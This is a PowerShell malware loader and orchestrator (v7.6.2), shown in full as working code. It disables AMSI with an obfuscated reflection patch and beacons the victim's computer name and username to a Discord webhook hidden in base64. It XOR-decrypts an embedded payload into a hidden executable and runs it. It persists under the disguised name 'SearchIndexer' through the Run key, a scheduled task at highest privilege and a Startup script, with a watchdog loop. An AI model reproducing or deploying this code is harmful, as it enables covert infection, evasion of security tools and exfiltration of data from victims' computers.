# v7.6.2 - single-process orchestrator (no C# / no injection in PS)
$ErrorActionPreference='SilentlyContinue'

# ============================ CONFIG ============================
$PAYLOAD_B64 = ''
# ^ repacked runtime base64. Empty = quiet idle, no staging, no spam.
$VER     = '7.6.2'
$WHB64   = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
$KEY     = '0x44,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35'
$DIR     = "$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
# ================================================================

function X([string]$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
function Enc([string]$s){[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s))}
function Gp([string]$p){try{$i=Get-Item $p -Force;$i.Attributes+=-bor ([IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)}catch{}}
function Unhide([string]$p){if(Test-Path $p){try{$i=Get-Item $p -Force;$i.Attributes-=[IO.FileAttributes]::Hidden;$i.Attributes-=[IO.FileAttributes]::System;$i.Attributes-=[IO.FileAttributes]::ReadOnly}catch{}}}
function Post([string]$b){try{$wc=New-Object Net.WebClient;$wc.Headers.Add('Content-Type','application/json');$wc.UploadString((X $WHB64),'POST',(@{content=$b}|ConvertTo-Json))}catch{}}
function MaybePost([string]$b){$n=Get-Date;if(-not $js -or ($n-$js).TotalSeconds -gt 240){$script:js=$n;Post $b}}
function AmState(){try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$t.GetField('am'+'siInit'+'Failed','NonPublic,Static');if([bool]$f.GetValue($null)){return $true}}catch{};return $false}

# --- AMSI kill (session is pre-killed by bootstrap; this covers the persisted path) ---
try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$t.GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true)}catch{}
$am=if(AmState){'A'}else{'UP'}

# --- env: dir + kill leftover v7.6.1 watchdog + sweep stale artifacts ---
try{New-Item -ItemType Directory -Force -Path $DIR|Out-Null}catch{}
foreach($f in @('load.dat','watch.dat')){
  $p=Join-Path $DIR $f
  if(Test-Path $p){Unhide $p;try{Remove-Item $p -Force}catch{}}
}
$lockOld=Join-Path $DIR 'watt.lck'
if(Test-Path $lockOld){try{$op=[int](Get-Content -Raw $lockOld -EA Stop);if($op -gt 0 -and (Get-Process -Id $op -EA SilentlyContinue)){Stop-Process -Id $op -Force}}catch{};try{Remove-Item $lockOld -Force}catch{}}
$lock=Join-Path $DIR 'watt72.lck'
if(Test-Path $lock){$op=0;try{$op=[int](Get-Content -Raw $lock -EA Stop)}catch{$op=0};if($op -gt 0 -and (Get-Process -Id $op -EA SilentlyContinue)){exit}}
try{[IO.File]::WriteAllText($lock,[string]$PID)}catch{}
powercfg /change standby-timeout-ac 0 2>$null|Out-Null
powercfg /change standby-timeout-dc 0 2>$null|Out-Null

# ============================ LOOP ==============================
$watchPlain=@'
$ErrorActionPreference='SilentlyContinue'
function X([string]$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
function Post([string]$b){try{$c=New-Object Net.WebClient;$c.Headers.Add('Content-Type','application/json');$c.UploadString('%%WH%%','POST',(@{content=$b}|ConvertTo-Json))}catch{}}
function MaybePost([string]$b){$n=Get-Date;if(-not $js -or ($n-$js).TotalSeconds -gt 240){$script:js=$n;Post $b}}
function AmState(){try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$t.GetField('am'+'siInit'+'Failed','NonPublic,Static');if([bool]$f.GetValue($null)){return $true}}catch{};return $false}
try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$t.GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true)}catch{}
$am=if(AmState){'A'}else{'UP'}
$dir='%%DIR%%'
try{New-Item -ItemType Directory -Force -Path $dir|Out-Null}catch{}
$lock=Join-Path $dir 'watt72.lck'
$op=0
if(Test-Path $lock){try{$op=[int](Get-Content -Raw $lock -EA Stop)}catch{$op=0}}
if($op -gt 0 -and (Get-Process -Id $op -EA SilentlyContinue)){exit}
try{[IO.File]::WriteAllText($lock,[string]$PID)}catch{}
$exe=Join-Path $dir 'runtime.exe'
$b=%%PAYLOAD%%
$boot=$true
$last=$null
$js=$null
if([string]::IsNullOrWhiteSpace($b)){MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | watch | payload:empty";$b=$null}
while($true){
  $found=$false
  Get-CimInstance Win32_Process -Filter "Name='SearchFilterHost.exe'" -EA SilentlyContinue|ForEach-Object{if($_.CommandLine -like '*hashvault*'){$found=$true}}
  if($found){
    if($boot){MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | watch | ok";$boot=$false}
  }elseif($b -and (-not $last -or ((Get-Date)-$last).TotalSeconds -gt 55)){
    $last=Get-Date
    if($boot){MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | watch | up";$boot=$false}
    try{
      if(-not (Test-Path $exe)){
        $k=[byte[]](%%KEY%%)
        $d=[Convert]::FromBase64String($b)
        $o=New-Object byte[] $d.Length
        for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $k[$i % $k.Length]}
        [IO.File]::WriteAllBytes($exe,$o)
        try{$i=Get-Item $exe -Force;$i.Attributes+=-bor ([IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)}catch{}
      }
      $p=Start-Process -FilePath $exe -WindowStyle Hidden -PassThru -Wait
      MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | load | exit:$($p.ExitCode)"
    }catch{MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | load | err"}
  }
  Start-Sleep 60
}
'@

$whX=("'")+(X $WHB64)+("'")
$watchPlain=$watchPlain.Replace('%%WH%%',$whX).Replace('%%DIR%%',"'"+$DIR+"'").Replace('%%VER%%',$VER).Replace('%%KEY%%',$KEY).Replace('%%PAYLOAD%%',"'"+$PAYLOAD_B64+"'")

$encLoop=Enc $watchPlain

# ========================= PERSISTENCE ==========================
$cmdLoop="powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encLoop"
try{New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SearchIndexer' -Value $cmdLoop -PropertyType String -Force|Out-Null}catch{}
try{schtasks /create /tn 'SearchIndexer' /tr "`"$cmdLoop`"" /sc onlogon /rl highest /f 2>$null|Out-Null}catch{}
try{
  $sm=Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\SearchIndexer.cmd'
  [IO.File]::WriteAllText($sm,"@echo off`r`n$cmdLoop`r`n")
  Gp $sm
}catch{}

# =========================== BEACON =============================
$ps=if($PAYLOAD_B64){'set'}else{'empty'}
Post "$VER | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | orch | payload:$ps"

# === drop into the watchdog loop in-process (AMSI already dead here) ===
IEX $watchPlain
